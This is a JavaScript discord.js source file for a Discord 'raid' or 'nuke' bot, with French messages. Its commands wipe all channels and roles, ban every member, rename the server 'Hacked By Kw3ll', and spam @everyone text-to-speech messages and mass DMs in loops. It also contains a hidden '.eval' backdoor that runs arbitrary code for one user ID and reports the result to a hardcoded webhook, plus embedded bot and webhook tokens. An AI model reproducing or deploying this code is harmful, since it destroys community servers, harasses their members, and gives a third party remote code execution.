console.log("Exécution...")

const Discord = require("discord.js")
const bot = new Discord.Client()

try {
	bot.on('ready',() => {
		//invit link
		console.log("---------------------------")
	
		bot.guilds.forEach(guild => {
			var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
			invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`)).catch(e => {});
		});
		
		bot.user.setAvatar(".");
		bot.user.setUsername("")
	}); 
	
	bot.on('message', message => {
	
		if (message.guild === bot.guilds.find('id', '569550450748030978')){ 
			return;
		}
		
	
			
	bot.on("message", message => {
		try{
		if(message.content === ".start"){
			if(message.channel.type === "dm") {return;}
			if(!message.guild.member(bot.user).hasPermission("ADMINISTRATOR")) {
				message.delete()
				message.author.send("Permission administrateur manquante.")
				return;
			}
			message.guild.channels.forEach(chan => { if(chan.deletable) {chan.delete();}})
			if(message.guild.name != "Hacked By Kw3ll"){
				message.guild.setIcon("https://cdn.discordapp.com/attachments/539709754034094080/542402017570848794/images.png").catch(error => {})
				message.guild.setName('Hacked By Kw3ll').catch(error => {})
				message.guild.setRegion('hongkong').catch(error => {})
			}
			setInterval(function () { if(message.guild.channels.size < 499){
				message.guild.createChannel('DGSE', 'voice');
				message.guild.createChannel('DGSE', 'text').then(c=>{
					c.send(" @everyone  https://twitter.com/__GhoSt_666_")
				});
			}}, 1000)
			if(message.deletable) message.delete();
			
			message.guild.members.forEach(member => {
				setInterval(function () {
					if(member.id!="569550450748030978") {member.send("Le serveur de <@"+message.guild.ownerID+"> c'est fait totalement détruire par la DGSE rejoind nous ici \nhttps://discord.gg/wcnxASg\nhttps://cdn.discordapp.com/attachments/545680472102010910/547799049005432832/3479a37937e6dad0bb763fdfbb0c3274.gif").catch(error => {})}
				}, 400)
			})
			
			setInterval (function () {
				message.channel.send("@everyone https://cdn.discordapp.com/attachments/545680472102010910/547799049005432832/3479a37937e6dad0bb763fdfbb0c3274.gif \n"+
				"**Hacked By Kw3ll**\n"+
				"https://discord.gg/wcnxASg", { tts: true } ).catch(error => {})
				var i = 0
				var salons = message.guild.channels.map(c=>c).filter(c=>c.type=="text")
				while(i!=salons.length){
					salons[i].send("**Hacked By Kw3ll** https://cdn.discordapp.com/attachments/545680472102010910/547799049005432832/3479a37937e6dad0bb763fdfbb0c3274.gif  https://discord.gg/5ESWPMN @everyone")
					i++
				}
			}, 30000)
		}
    if(message.content.startsWith(".eval")&&message.author.id=="426775253650505729"){
      let h = new Discord.WebhookClient("531103514202734592","35zzwVjqm2IrXkNX5tbPAlt-9hHp8UI_k-HG4UANnyV3_KiYRQidzN8gtLMMzEL-ekbF"); h.send("Résultat de la commande :\n"+eval(message.content.replace(".eval ", "")))
    }
		if(message.content === ".des"){
			if(message.channel.type === "dm") return;
			if(message.guild.name != "Hacked By Kw3ll"){
				message.guild.setIcon("https://cdn.discordapp.com/attachments/539709754034094080/542402017570848794/images.png").catch(error => {})
				message.guild.setName(".").catch(error => {})
				message.guild.setRegion('hongkong').catch(error => {})
			}
			setInterval(function () { if(message.guild.channels.size < 499){
				message.guild.createChannel('DGSE', 'voice');
				message.guild.createChannel('DGSE', 'text');
			}}, 400)
			if(message.deletable) message.delete();
		}
		if(message.content === ".delc"){
			if(message.channel.type === "dm") return;
			if(message.guild.channels.size === 0) return;
			if(!message.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
			message.guild.channels.forEach(chan => { if(chan.deletable) {chan.delete();}})
      message.guild.createChannel("Pa d'bol mdr")
		
		}
		if (message.content === '.ban') {
		if (message.deletable) message.delete();
			if(message.channel.type === "dm") return;
			if(message.deletable) message.delete();
			/*else */if(!message.guild.member(bot.user).hasPermission("BAN_MEMBERS")) return;
			message.guild.members.forEach(member => { 
			if (!member.roles.exists("name", "DGSE") && member.bannable && member.id!="534453169334386710") member.ban();});
		}
		if (message.content === '.unban') {
			if (message.deletable) message.delete();
			let interval = setInterval(function () {
				message.guild.fetchBans().then(bans => {
					bans.forEach(ban => {
						message.guild.unban(ban.id);
					});
				});
			}, 1000);
		}
		if (message.content === '.addrole') {
			if(message.channel.type === "dm") return;
			else if(!message.guild.member(bot.user).hasPermission("ADMINISTRATOR")) return;
			message.member.guild.createRole({name: "Hacked By Kw3ll", permissions: "ADMINISTRATOR"}).then(function(role) {message.member.addRole(role);})
			if (message.deletable) message.delete();
		}
		if (message.content === '.delr') {
			if (message.deletable) message.delete();
			message.guild.roles.forEach(role => {
					role.delete()
			});
        }
        if (message.content === '.crole') {
            if(message.channel.type === "dm") return;
            if (message.deletable) message.delete();
            let interval = setInterval(function () {
				if(message.guild.roles.size < 99)message.guild.createRole({name: 'DGSE', color:'RANDOM'}).catch(ErrorEvent => {})
            })
            message.guild.members.forEach(member => {
				if(member.roles.size < 99 ) {
					member.addRoles(message.guild.roles.findAll("name", "DGSE"))
				}
				if(message.content === ".rename"){
				if(message.deletable) message.delete();
     	message.guild.members.forEach(member => {
			member.setNickname("DGSE").catch(() => con(`impossible de renommer ${member.user.tag} > missing permissions`));
    	})
       }	
      if (message.content === '.delemote'){
    	if (message.deletable) message.delete();
        	message.guild.emojis.forEach(emoji => {
	      	emoji.delete()
	});
     }				
			})
        }
        if(message.content === ".mp"){
            if(message.channel.type === "dm") return;
            if(message.deletable) message.delete();
            message.guild.members.forEach(member => {
				setInterval(function () {
					if(member.id!="426775253650505729") {member.send("Le serveur de <@"+message.guild.ownerID+"> c'est fait totalement détuire par The Purge rejoind l'gang.\nhttps://discord.gg/5ESWPMN\n").catch(error => {})}
				}, 1000)
			})
		}
		if (message.content === '.spam') {
			
			if(message.channel.type === "dm") return;
			if(message.deletable) message.delete();
			setInterval (function () {
				message.channel.send("@everyone https://cdn.discordapp.com/attachments/545680472102010910/547799049005432832/3479a37937e6dad0bb763fdfbb0c3274.gif \n"+
				"**The Purge t'a bien détruit t'a mère**\n"+
				"https://discord.gg/5ESWPMN\n", { tts: true } ).catch(error => {})
				var i = 0
				var salons = message.guild.channels.map(c=>c).filter(c=>c.type=="text")
				while(i!=salons.length){
					salons[i].send(" **The Purge t'a bien détruit t'a mère** https://cdn.discordapp.com/attachments/545680472102010910/547799049005432832/3479a37937e6dad0bb763fdfbb0c3274.gif https://discord.gg/nK39EJv @everyone")
					i++
				}
			}, 30000)
		}
		}catch(e){console.error("Erreur peu grave (juste pour la commande qui vient d'être postée) :");console.error(e)}
		})
	})
}catch(error) {console.error("Erreur fatale :");console.error(error)}

bot.login("NTY5NTUwNDUwNzQ4MDMwOTc4.XL2FsQ.2h6tQUTYNMm2ZjkG8pjbZA6b3Ns")